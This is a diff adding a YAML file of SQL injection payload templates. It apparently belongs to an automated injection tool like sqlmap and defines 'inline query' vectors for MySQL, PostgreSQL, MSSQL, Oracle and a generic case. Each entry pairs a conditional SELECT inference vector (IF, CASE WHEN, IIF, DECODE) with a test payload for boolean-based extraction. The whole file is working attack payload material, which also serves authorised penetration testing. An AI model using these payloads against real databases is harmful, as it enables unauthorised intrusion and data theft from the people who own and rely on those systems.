@@ -1,0 +1,56 @@
+# Inline-query payloads.
+# stype 6 = inline-query.
+payloads:
+  - title: "Generic inline query"
+    stype: 6
+    level: 1
+    risk: 1
+    clause: [0]
+    where: 1
+    vector: "(SELECT [INFERENCE])"
+    request:
+      payload: "(SELECT [RANDNUM])"
+
+  - title: "MySQL inline query"
+    stype: 6
+    level: 1
+    risk: 1
+    clause: [0]
+    where: 1
+    vector: "(SELECT IF([INFERENCE],[ORIGVALUE],[RANDNUM]))"
+    request:
+      payload: "(SELECT IF([RANDNUM]=[RANDNUM],[ORIGVALUE],[RANDNUM]))"
+    dbms: ["mysql", "mariadb", "percona", "tidb"]
+
+  - title: "PostgreSQL inline query"
+    stype: 6
+    level: 1
+    risk: 1
+    clause: [0]
+    where: 1
+    vector: "(SELECT CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM] END)"
+    request:
+      payload: "(SELECT CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM] END)"
+    dbms: ["postgresql", "greenplum", "redshift", "cockroachdb", "yugabyte", "alloydb", "opengauss"]
+
+  - title: "MSSQL inline query"
+    stype: 6
+    level: 1
+    risk: 1
+    clause: [0]
+    where: 1
+    vector: "(SELECT IIF(([INFERENCE]),[ORIGVALUE],[RANDNUM]))"
+    request:
+      payload: "(SELECT IIF(([RANDNUM]=[RANDNUM]),[ORIGVALUE],[RANDNUM]))"
+    dbms: ["mssql"]
+
+  - title: "Oracle inline query"
+    stype: 6
+    level: 1
+    risk: 1
+    clause: [0]
+    where: 1
+    vector: "(SELECT DECODE([INFERENCE],1,[ORIGVALUE],[RANDNUM]) FROM DUAL)"
+    request:
+      payload: "(SELECT DECODE([RANDNUM]=[RANDNUM],1,[ORIGVALUE],[RANDNUM]) FROM DUAL)"
+    dbms: ["oracle"]
